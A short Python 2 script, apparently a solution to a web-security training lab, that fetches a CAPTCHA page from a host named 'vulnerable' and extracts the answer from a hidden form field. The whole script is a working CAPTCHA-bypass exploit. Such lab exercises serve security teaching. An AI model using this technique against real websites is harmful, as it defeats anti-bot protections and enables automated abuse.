import httplib, re

if __name__ == '__main__':
    conn = httplib.HTTPConnection('vulnerable')
    conn.request('GET', '/captcha/example2/')
    res = conn.getresponse()
    print re.findall(r'<input type="hidden" name="answer" value="(.*)"/>', res.read())[0]
